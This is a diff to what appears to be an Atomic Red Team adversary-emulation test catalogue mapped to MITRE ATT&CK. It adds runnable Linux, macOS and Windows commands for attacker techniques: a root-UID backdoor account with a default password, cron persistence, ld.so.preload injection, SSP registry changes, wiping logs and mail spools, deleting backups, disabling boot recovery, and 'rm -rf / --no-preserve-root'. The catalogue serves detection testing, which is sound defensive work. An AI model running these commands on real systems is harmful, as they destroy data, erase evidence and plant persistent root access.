@@ -1156,6 +1156,27 @@ persistence:
         command: |
           New-LocalUser -Name #{username} -NoPassword
           net user /add #{username}
+    - name: Create a new user in Linux with `root` UID and GID.
+      description: 'Creates a new user in Linux and adds the user to the `root` group.
+        This technique was used by adversaries during the Butter attack campaign.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        username:
+          description: Username of the user to create
+          type: String
+          default: butter
+        password:
+          description: Password of the user to create
+          type: String
+          default: BetterWithButter
+      executor:
+        name: bash
+        command: |-
+          useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}
+          echo "#{password}" | passwd --stdin #{username}
   T1158:
     technique:
       id: attack-pattern--dc27c2ec-c5f9-4228-ba57-d67b590bda93
@@ -2125,8 +2146,10 @@ persistence:
       created: '2017-12-14T16:46:06.044Z'
       identifier: T1168
     atomic_tests:
-    - name: Cron Job
-      description: 'Set a cron job
+    - name: Cron - Replace crontab with referenced file
+      description: 'This test replaces the current user''s crontab file with the contents
+        of the referenced file. This technique was used by numerous IoT automated
+        exploitation attacks.
 
 '
       supported_platforms:
@@ -2135,19 +2158,47 @@ persistence:
       - ubuntu
       - linux
       input_arguments:
-        script:
-          description: Script to execute
-          type: path
+        command:
+          description: Command to execute
+          type: string
           default: "/tmp/evil.sh"
+        tmp_cron:
+          description: Temporary reference file to hold evil cron schedule
+          type: path
+          default: "/tmp/persistevil"
       executor:
-        name: sh
-        command: 'echo "* * * * * #{script}" > /tmp/persistevil && crontab /tmp/persistevil
+        name: bash
+        command: 'echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
 
 '
-    - name: Cron Job
-      description: 'Manually set a cron job
+    - name: Cron - Add script to cron folder
+      description: 'This test adds a script to a cron folder configured to execute
+        on a schedule. This technique was used by the threat actor Rocke during the
+        exploitation of Linux web servers.
 
 '
+      supported_platforms:
+      - macos
+      - centos
+      - ubuntu
+      - linux
+      input_arguments:
+        command:
+          description: Command to execute
+          type: string
+          default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
+        cron_script_name:
+          description: Name of file to store in cron folder
+          type: string
+          default: persistevil
+      executor:
+        name: bash
+        command: 'echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+
+'
+    - name: Event Monitor Daemon Persistence
+      description: "This test adds persistence via a plist to execute via the macOS
+        Event Monitor Daemon. \n"
       supported_platforms:
       - macos
       - centos
@@ -3241,6 +3292,73 @@ persistence:
           reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
           reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
           shutdown /r /t 0
+  T1101:
+    technique:
+      id: attack-pattern--6c174520-beea-43d9-aac6-28fb77f3e446
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Security Support Provider
+      description: |-
+        Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.
+         (Citation: Graeber 2014)
+      external_references:
+      - external_id: T1101
+        url: https://attack.mitre.org/techniques/T1101
+        source_name: mitre-attack
+      - url: http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html
+        description: Graeber, M. (2014, October). Analysis of Malicious Security Support
+          Provider DLLs. Retrieved March 1, 2017.
+        source_name: Graeber 2014
+      - url: https://technet.microsoft.com/en-us/library/dn408187.aspx
+        description: Microsoft. (2013, July 31). Configuring Additional LSA Protection.
+          Retrieved June 24, 2015.
+        source_name: Microsoft Configure LSA
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_data_sources:
+      - DLL monitoring
+      - Windows Registry
+      - Loaded DLLs
+      x_mitre_detection: 'Monitor the Registry for changes to the SSP Registry keys.
+        Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012
+        R2 may generate events when unsigned SSP DLLs try to load into the LSA by
+        setting the Registry key <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+        File Execution Options\LSASS.exe</code> with AuditLevel = 8. (Citation: Graeber
+        2014) (Citation: Microsoft Configure LSA)'
+      x_mitre_permissions_required:
+      - Administrator
+      x_mitre_platforms:
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: persistence
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2017-05-31T21:31:13.447Z'
+      identifier: T1101
+    atomic_tests:
+    - name: Modify SSP configuration in registry
+      description: Add a value to a Windows registry SSP key, simulating an adversarial
+        modification of those keys.
+      supported_platforms:
+      - windows
+      input_arguments:
+        fake_ssp_dll:
+          description: Value added to registry key. Normally refers to a DLL name
+            in C:\Windows\System32.
+          type: String
+          default: not-a-ssp
+      executor:
+        name: powershell
+        command: |
+          # run these in sequence
+          $SecurityPackages = Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'
+          $SecurityPackagesUpdated = $SecurityPackages
+          $SecurityPackagesUpdated += "#{fake_ssp_dll}"
+          Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated
+
+          # revert (before reboot)
+          Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackages
   T1166:
     technique:
       id: attack-pattern--c0df6533-30ee-4a4a-9c6d-17af5abdf0b2
@@ -5287,7 +5405,7 @@ defense-evasion:
 
 '
     - name: bcdedit
-      description: 'xxx
+      description: 'This test leverages `bcdedit` to remove boot-time recovery measures.
 
 '
       supported_platforms:
@@ -5298,14 +5416,27 @@ defense-evasion:
           bcdedit /set {default} bootstatuspolicy ignoreallfailures
           bcdedit /set {default} recoveryenabled no
     - name: wbadmin
-      description: 'xxx
-
-'
+      description: "This test deletes Windows Backup catalogs. \n"
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         command: 'wbadmin delete catalog -quiet
+
+'
+    - name: Delete Filesystem - Linux
+      description: 'This test deletes the entire root filesystem of a Linux system.
+        This technique was used by Amnesia IoT malware to avoid analysis. This test
+        is dangerous and destructive, do NOT use on production equipment.
+
+'
+      supported_platforms:
+      - linux
+      - centos
+      - ubuntu
+      executor:
+        name: bash
+        command: 'rm -rf / --no-preserve-root > /dev/null 2> /dev/null
 
 '
   T1222:
@@ -5716,6 +5847,23 @@ defense-evasion:
       executor:
         name: bash
         command: 'chown #{owner} #{file_or_folder} -R
+
+'
+    - name: chattr - Remove immutable file attribute
+      description: |
+        Remove's a file's `immutable` attribute using `chattr`.
+        This technique was used by the threat actor Rocke during the compromise of Linux web servers.
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        file_to_modify:
+          description: Path of the file
+          type: path
+          default: "/var/spool/cron/root"
+      executor:
+        name: sh
+        command: 'chattr -i #{file_to_modify}
 
 '
   T1144:
@@ -6451,6 +6599,39 @@ defense-evasion:
         command: |
           rm -rf /private/var/log/system.log*
           rm -rf /private/var/audit/*
+    - name: Overwrite Linux Mail Spool
+      description: 'This test overwrites the Linux mail spool of a specified user.
+        This technique was used by threat actor Rocke during the exploitation of Linux
+        web servers.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        username:
+          description: Username of mail spool
+          type: String
+          default: root
+      executor:
+        name: bash
+        command: 'echo 0> /var/spool/mail/#{username}
+
+'
+    - name: Overwrite Linux Log
+      description: 'This test overwrites the specified log. This technique was used
+        by threat actor Rocke during the exploitation of Linux web servers.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        log_path:
+          description: Path of specified log
+          type: Path
+          default: "/var/log/secure"
+      executor:
+        name: bash
+        command: 'echo 0> #{log_path}'
   T1202:
     technique:
       id: attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e
@@ -7741,6 +7922,24 @@ defense-evasion:
       executor:
         name: powershell
         command: 'Invoke-DllInjection.ps1 -ProcessID #{process_id} -Dll #{dll_payload}
+
+'
+    - name: Shared Library Injection via /etc/ld.so.preload
+      description: 'This test adds a shared library to the `ld.so.preload` list to
+        execute and intercept API calls. This technique was used by threat actor Rocke
+        during the exploitation of Linux web servers. This requires the `glibc` package.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_shared_library:
+          description: Path to a shared library object
+          type: Path
+          default: "/tmp/evil_module.so"
+      executor:
+        name: bash
+        command: 'echo #{path_to_shared_library} > /etc/ld.so.preload
 
 '
   T1121:
@@ -10407,6 +10606,24 @@ privilege-escalation:
       executor:
         name: powershell
         command: 'Invoke-DllInjection.ps1 -ProcessID #{process_id} -Dll #{dll_payload}
+
+'
+    - name: Shared Library Injection via /etc/ld.so.preload
+      description: 'This test adds a shared library to the `ld.so.preload` list to
+        execute and intercept API calls. This technique was used by threat actor Rocke
+        during the exploitation of Linux web servers. This requires the `glibc` package.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_shared_library:
+          description: Path to a shared library object
+          type: Path
+          default: "/tmp/evil_module.so"
+      executor:
+        name: bash
+        command: 'echo #{path_to_shared_library} > /etc/ld.so.preload
 
 '
   T1053:
@@ -14914,8 +15131,10 @@ execution:
       created: '2017-12-14T16:46:06.044Z'
       identifier: T1168
     atomic_tests:
-    - name: Cron Job
-      description: 'Set a cron job
+    - name: Cron - Replace crontab with referenced file
+      description: 'This test replaces the current user''s crontab file with the contents
+        of the referenced file. This technique was used by numerous IoT automated
+        exploitation attacks.
 
 '
       supported_platforms:
@@ -14924,19 +15143,47 @@ execution:
       - ubuntu
       - linux
       input_arguments:
-        script:
-          description: Script to execute
-          type: path
+        command:
+          description: Command to execute
+          type: string
           default: "/tmp/evil.sh"
+        tmp_cron:
+          description: Temporary reference file to hold evil cron schedule
+          type: path
+          default: "/tmp/persistevil"
       executor:
-        name: sh
-        command: 'echo "* * * * * #{script}" > /tmp/persistevil && crontab /tmp/persistevil
+        name: bash
+        command: 'echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
 
 '
-    - name: Cron Job
-      description: 'Manually set a cron job
+    - name: Cron - Add script to cron folder
+      description: 'This test adds a script to a cron folder configured to execute
+        on a schedule. This technique was used by the threat actor Rocke during the
+        exploitation of Linux web servers.
 
 '
+      supported_platforms:
+      - macos
+      - centos
+      - ubuntu
+      - linux
+      input_arguments:
+        command:
+          description: Command to execute
+          type: string
+          default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
+        cron_script_name:
+          description: Name of file to store in cron folder
+          type: string
+          default: persistevil
+      executor:
+        name: bash
+        command: 'echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+
+'
+    - name: Event Monitor Daemon Persistence
+      description: "This test adds persistence via a plist to execute via the macOS
+        Event Monitor Daemon. \n"
       supported_platforms:
       - macos
       - centos
